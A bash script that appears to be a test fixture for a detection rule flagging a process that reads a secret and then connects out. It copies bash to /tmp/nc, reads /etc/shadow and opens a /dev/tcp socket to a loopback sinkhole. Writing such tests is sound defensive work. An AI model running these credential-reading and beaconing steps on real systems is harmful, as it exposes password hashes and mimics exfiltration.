#!/usr/bin/env bash
# T1552+T1041 — a suspicious process reads a secret THEN beacons, SAME pid, firing
# `suspicious_process_read_sensitive_and_connected` (OCSF 9002). bash-as-/tmp/nc
# makes the process half suspicious. The read uses bash's `read` BUILTIN with a
# redirect (`< /etc/shadow`) so /etc/shadow is opened in /tmp/nc's OWN pid — NOT a
# forked `cat` child (a child would read under a different pid and the exfil chain,
# which joins read+connect by pid, could never form). Connects to the loopback
# sinkhole so the connect succeeds; trailing `:` (builtin) stops bash exec-replacing
# /tmp/nc, so the pid keeps its suspicious image while corr correlates read+connect.
set -eu
host="${SINK_LOOPBACK:-127.0.0.1}"
port="${SINK_PORT:-4444}"
cp -f "$(command -v bash)" /tmp/nc && chmod +x /tmp/nc
timeout 6 /tmp/nc -c "IFS= read -r _ < /etc/shadow 2>/dev/null || true; exec 3<>/dev/tcp/${host}/${port}; sleep 3; :" 2>/dev/null || true
